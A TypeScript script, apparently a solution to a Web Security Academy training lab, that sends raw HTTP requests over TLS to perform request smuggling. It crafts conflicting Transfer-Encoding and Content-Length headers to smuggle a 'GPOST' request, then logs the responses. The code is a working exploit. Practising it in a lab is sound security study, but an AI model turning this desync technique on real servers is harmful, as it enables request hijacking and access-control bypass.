// import https from 'https'
import net from "net";
import tls from "tls";

async function lab1() {
  await sendRequest(1);
  await sendRequest(2);
}
function sendRequest(round: 1 | 2) {
  return new Promise<true>((resolve) => {
    const url = new URL(
      "https://0ae200cc04c1b1a8814fed49003b0098.web-security-academy.net/",
    );
    const smuggledBody = `0\r\n\r\nGPOST / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0`;
    const socket = net.connect(443, url.host);
    socket.on("connect", () => {
      const tlsSocket = tls.connect({ socket, servername: url.host });
      tlsSocket.on("secureConnect", () => {
        const firstBody =
          "POST / HTTP/1.1\r\n" +
          `host: ${url.host}\r\n` +
          "transfer-encoding: chunked\r\n" +
          "content-type: text/plain\r\n" +
          `content-length: ${Buffer.byteLength(smuggledBody)}\r\n` +
          "\r\n" +
          smuggledBody;
        const secondBody = `\r\n\r\nGET / HTTP/1.1\r\nhost: ${url.host}\r\ncontent-length: 0\r\n\r\n`;
        tlsSocket.write(round === 1 ? firstBody : secondBody);
      });
      const chunks: Buffer[] = [];
      tlsSocket.on("data", (chunk) => {
        chunks.push(chunk);
      });
      tlsSocket.on("end", () => {
        const body = Buffer.concat(chunks).toString("utf-8");
        console.log(body);
        resolve(true);
      });
    });
  });
}

lab1();
